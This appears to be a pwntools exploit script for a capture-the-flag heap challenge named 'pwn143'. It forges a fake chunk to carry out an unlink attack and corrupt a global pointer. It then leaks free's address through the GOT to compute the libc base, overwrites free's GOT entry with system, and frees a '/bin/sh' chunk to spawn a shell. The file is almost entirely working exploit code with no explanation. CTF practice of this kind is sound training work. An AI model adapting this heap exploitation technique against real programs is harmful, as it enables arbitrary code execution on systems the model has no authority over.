from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
context.terminal = ['tmux', 'split-window', '-h', '-p', '50', '-c', '#{pane_current_path}']
#io = process('./pwn')
#io = remote('pwn.challenge.ctf.show',28243)
GDBSCRIPT = r'''
'''
elf = ELF('./pwn143')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def start():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=GDBSCRIPT)
    io = process([elf.path])
    if args.ATTACH:
        gdb.attach(io, gdbscript=GDBSCRIPT)
    return io
free_got = elf.got['free']

def add(length,context):
        io.recvuntil("Your choice:")
        io.sendline("2")
        io.recvuntil("Please enter the length:")
        io.sendline(str(length))
        io.recvuntil("Please enter the name:")
        io.send(context)

def edit(idx,length,context):
        io.recvuntil("Your choice:")
        io.sendline("3")
        io.recvuntil("Please enter the index:")
        io.sendline(str(idx))
        io.recvuntil("Please enter the length of name:")
        io.sendline(str(length))
        io.recvuntil("Please enter the new name:")
        io.send(context)

def delete(idx):
        io.recvuntil("Your choice:")
        io.sendline("4")
        io.recvuntil("Please enter the index:")
        io.sendline(str(idx))

def show():
        io.sendlineafter("Your choice:", "1")
io = start()
add(0x40,'a' * 8)
add(0x80,'b' * 8)
add(0x80,'c' * 8)
add(0x20,'/bin/sh\x00')
#gdb.attach(io)

ptr = 0x6020a8
fd = ptr-0x18
bk = ptr-0x10

fake_chunk  = p64(0)
fake_chunk += p64(0x41)
fake_chunk += p64(fd)
fake_chunk += p64(bk)
fake_chunk += b'\x00'*0x20
fake_chunk += p64(0x40)
fake_chunk += p64(0x90)

edit(0,len(fake_chunk),fake_chunk)
#gdb.attach(io)

delete(1)
log.info("free_got:%x",hex(free_got))
payload = p64(0) + p64(0) + p64(0x40) + p64(free_got)
edit(0,0x20,payload)
#gdb.attach(io)
show()
io.recv(4)
data = io.recv(6)
free = u64(data.ljust(8, b"\x00"))  
log.info("free addr is:%x",free)
libc = ELF('/home/pouoq/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
libc_base = free - libc.symbols['free']
system = libc_base + libc.symbols['system']
success(hex(system))
pause()
edit(0,0x8,p64(system))
pause()
#gdb.attach(io)
delete(3)

io.interactive()